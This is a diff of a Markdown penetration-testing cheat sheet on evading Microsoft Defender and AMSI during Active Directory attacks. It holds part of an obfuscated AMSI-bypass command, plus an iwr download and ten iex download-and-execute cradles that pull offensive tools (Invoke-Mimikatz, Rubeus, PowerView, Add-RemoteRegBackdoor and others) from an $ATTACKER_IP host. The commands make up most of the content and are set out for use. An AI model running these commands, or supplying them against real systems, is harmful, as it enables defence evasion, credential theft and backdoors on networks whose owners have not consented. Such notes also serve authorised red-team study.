@@ -1,5 +1,10 @@
 #AD_av_evasion
 
+# <span style="color:#FF5555">AV / AMSI Evasion</span>
+
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP (hosting payloads via HTTP/HFS)
+
 **Defender** = Security guard checking everyone at the door  
 **AMSI** = Undercover cop listening to what you say  
 **Bypass** = Showing a fake badge or sneaking through the b
@@ -11,7 +16,7 @@
 |**AMSI**|Looks for malicious commands in PowerShell
 
 
-**Disable MS Defender**
+## <span style="color:#8BE9FD">Disable MS Defender</span>
 
 - Bypass the execution policy
 
@@ -48,22 +53,22 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 
 
 ```powershell
-iwr http://192.168.100.XX/rubeus.exe -outfile rubeus.exe
+iwr http://$ATTACKER_IP/rubeus.exe -outfile rubeus.exe
 ```
 
 - Download and execute cradle (Files can be hosted using HFS.exe or Python Webserver)
 
 
 ```powershell
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/PowerView.ps1')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Invoke-Mimikatz.ps1')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/mimilib.dll')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemotePSRemoting.ps1')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Set-RemoteWMI.ps1')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/MS-RPRN.exe')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Rubeus.exe')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Add-RemoteRegBackdoor.ps1')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-PSRemotingLocalAdminAccess.ps1')
-iex (New-Object Net.WebClient).DownloadString('http://192.168.100.XX/Find-WMILocalAdminAccess.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/PowerView.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Invoke-Mimikatz.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/mimilib.dll')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Set-RemotePSRemoting.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Set-RemoteWMI.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/MS-RPRN.exe')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Rubeus.exe')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Add-RemoteRegBackdoor.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Find-PSRemotingLocalAdminAccess.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://$ATTACKER_IP/Find-WMILocalAdminAccess.ps1')
 
 ```
